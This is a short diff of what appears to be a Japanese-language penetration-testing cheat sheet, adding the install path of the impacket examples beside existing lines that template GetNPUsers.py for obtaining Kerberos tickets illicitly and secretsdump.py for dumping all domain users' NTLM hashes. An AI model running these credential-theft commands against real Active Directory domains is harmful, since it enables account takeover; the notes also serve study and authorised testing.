@@ -5,6 +5,7 @@
 --dc #ドメコンの指定
 
 //impacket
+/usr/share/doc/python3-impacket/examples/ #impacketのパス
 ./GetNPUsers.py <domain name>/<user name>　#TGTを不正に入手
 ./secretsdump.py -just-dc-ntlm <user>@<domain> -outputfile <file name> #複製権限があるユーザで全員のNTLMをダンプ
 
